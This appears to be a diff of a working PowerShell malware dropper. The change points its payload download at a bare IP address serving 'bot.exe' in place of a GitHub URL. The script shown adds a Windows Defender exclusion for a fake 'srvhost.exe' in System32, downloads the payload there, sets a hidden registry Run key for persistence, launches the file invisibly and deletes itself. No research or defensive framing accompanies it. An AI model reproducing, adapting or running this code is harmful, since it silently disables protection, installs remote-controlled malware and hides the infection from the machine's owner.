@@ -4,7 +4,7 @@ if (-not ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdenti
 }
 $p = "$env:SystemRoot\System32\srvhost.exe"
 Add-MpPreference -ExclusionPath $p
-if (!(Test-Path $p)) { (New-Object Net.WebClient).DownloadFile('https://raw.githubusercontent.com/Rdthaiphno064/mmb/refs/heads/main/modules/fl.exe', $p) }
+if (!(Test-Path $p)) { (New-Object Net.WebClient).DownloadFile('http://160.187.246.125/bot.exe', $p) }
 Set-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "srvhost" -Value 'powershell -ep Bypass -WindowStyle Hidden -Command "& \"$p\""' -Force
 Start-Process $p -WindowStyle Hidden
 Remove-Item $MyInvocation.MyCommand.Path -Force
